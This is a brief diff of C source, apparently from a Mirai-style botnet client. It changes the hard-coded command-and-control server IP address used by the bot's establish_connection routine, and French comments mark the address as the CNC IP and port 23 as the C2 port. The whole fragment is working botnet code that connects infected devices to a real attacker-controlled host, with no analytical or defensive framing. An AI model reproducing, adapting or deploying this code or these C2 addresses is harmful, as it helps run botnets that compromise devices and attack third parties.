@@ -402,7 +402,7 @@ static void establish_connection(void)
      //    resolve_func();
 
      srv_addr.sin_family = AF_INET;
-     srv_addr.sin_addr.s_addr = inet_addr("51.20.81.26");  // IP du CNC
+     srv_addr.sin_addr.s_addr = inet_addr("13.48.13.8");  // IP du CNC
      srv_addr.sin_port = htons(23);                      // Port du bot C2
 
     pending_connection = TRUE;
